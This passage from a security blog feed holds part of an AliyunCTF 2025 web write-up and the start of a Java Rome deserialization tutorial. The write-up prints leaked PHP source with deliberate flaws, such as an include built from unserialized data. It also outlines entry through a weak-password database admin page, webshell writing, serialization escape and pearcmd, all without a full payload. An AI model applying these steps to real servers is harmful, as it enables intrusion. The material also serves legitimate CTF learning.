class="token punctuation">></span></span>                                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pt-editor<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h6</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pt-title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>补卡原因<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h6</span><span class="token punctuation">></span></span>                                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reason<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Lets get started<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                                         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-auto ml-md-auto<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-secondary btn-width-lg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>提交<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'./cache.php'</span><span class="token punctuation">;</span><span class="token variable">$check</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">checkin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reason'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debug_buka'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$time</span><span class="token operator">=</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debug_buka'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$time</span><span class="token operator">=</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d H:i:s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$arraya</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"name"</span><span class="token operator">=></span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"reason"</span><span class="token operator">=></span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reason'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"time"</span><span class="token operator">=></span><span class="token variable">$time</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"background"</span><span class="token operator">=></span><span class="token string double-quoted-string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$check</span><span class="token operator">-></span><span class="token function">writec</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'-'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$arraya</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'check'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$cachefile</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/cache/'</span> <span class="token operator">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'-'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d"</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$cachefile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$cachefile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$checkdata</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php exit;//"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$check</span><span class="token operator">=</span><span class="token string double-quoted-string">"/var/www/html/"</span><span class="token operator">.</span><span class="token variable">$checkdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'background'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">;</span>        <span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$check</span></span>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token string single-quoted-string">'error.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先要登录，但是字典跑了半天都没出，尝试注入也无果</p><p>这个时候突然在想会不会login.php也有和index.php一样的文件泄露，还真有</p><p>&#x2F;login.php~</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"web"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"web"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"web"</span><span class="token punctuation">;</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败: "</span> <span class="token operator">.</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'./pass.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$endpass</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token operator">.</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">':'</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select password from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$endpass</span><span class="token operator">==</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert(\"Welcome <span class="token interpolation"><span class="token variable">$username</span></span>!\");window.location.href=\"./index.php\";&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert(\"错误\");&lt;/script>"</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还真有，猜测其他文件也有<code>~</code>泄露</p><p>pass.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">mypass</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">generateRandomString</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$characters</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="token punctuation">;</span>    <span class="token variable">$charactersLength</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$characters</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$randomString</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$randomString</span> <span class="token operator">.=</span> <span class="token variable">$characters</span><span class="token punctuation">[</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$charactersLength</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$randomString</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkpass</span><span class="token punctuation">(</span><span class="token variable">$plain</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">generateRandomString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$salt</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span> <span class="token operator">.</span> <span class="token variable">$plain</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$salt</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cache.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** *  */</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">myCache</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">writecache</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/cache/'</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span><span class="token variable">$cachedata</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php exit;//"</span> <span class="token operator">.</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$cachedata</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">checkin</span><span class="token punctuation">&#123;</span><span class="token keyword">function</span> <span class="token function-definition function">writec</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$wr</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">myCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$wr</span><span class="token operator">-></span><span class="token function">writecache</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么接下来就是想办法过登录，想办法构造sql语句使其返回内容，但是没思路</p><br><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>？什么叫扫出来个 adminer_481.php 弱口令 root:root 登录写shell秒了</p><p><img src="/blog/2025/02/22/AliyunCTF2025/image-20250224223912252.png" alt="image-20250224223912252"></p><p><img src="/blog/2025/02/22/AliyunCTF2025/image-20250224224123939.png" alt="image-20250224224123939"></p><hr><h2 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h2><p>还是要扫出来 adminer_481.php，那我字典呢？（难绷，刚写完之后今晚打渗透的时候就遇到这个 adminer.php 了）</p><p>web:web 登录数据库改前台登录密码</p><p>然后打反序列化逃逸和pearcmd</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.xmcve.com/2025/02/25/%E9%98%BF%E9%87%8C%E4%BA%91CTF2025-Writeup&quot;&gt;https://blog.xmcve.com/2025/02/25/%E9%98%BF%E9%87%8C%E4%BA%91CTF2025-Writeup&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/news/17029&quot;&gt;https://xz.aliyun.com/news/17029&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>Rome反序列化</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-02-17T08:04:41.000Z</published>
    <updated>2025-02-19T10:29:06.813Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://boogipop.com/2024/02/12/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/">https://boogipop.com/2024/02/12/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/</a></p><p><a href="https://xz.aliyun.com/news/12214">https://xz.aliyun.com/news/12214</a></p><p><a href="https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE">https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE</a></p><p><a href="https://luokuang1.github.io/2025/02/06/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://luokuang1.github.io/2025/02/06/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://zjackky.github.io/post/java-security-rome-chain-1ojxop.html">https://zjackky.github.io/post/java-security-rome-chain-1ojxop.html</a></p><span id="more"></span><p>和 FastJson 高度相似，因为都会调用任意的 setter 和 getter 方法，从而导致RCE</p><hr><h1 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h1><p>是一个有用的工具库，帮助处理和操作 XML 格式的数据。ROME 库允许我们把 XML 数据转换成 Java 中的对象，这样我们可以更方便地在程序中操作数据。另外，它也支持将 Java 对象转换成 XML 数据，这样我们就可以把数据保存成 XML 文件或者发送给其他系统。</p><p>总之，就是一个 RSS 阅读器</p><p>ROME提供了 <code>ToStringBean</code> 这个类，提供深入的 <code>toString</code> 方法对 Java Bean 进行操作。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>maven 模板直接 quickstart 即可</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>rome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>rome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.javassist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javassist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.28.0-GA<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="EqualsBean链"><a href="#EqualsBean链" class="headerlink" title="EqualsBean链"></a>EqualsBean链</h1><p>看一下 ysoserial 上的调用栈：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">*</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">NativeMethodAccessorImpl</span><span class="token punctuation">.</span><span class="token function">invoke0</span><span class="token punctuation">(</span><span class="token class-name">Method</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">NativeMethodAccessorImpl</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">DelegatingMethodAccessorImpl</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">Method</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span 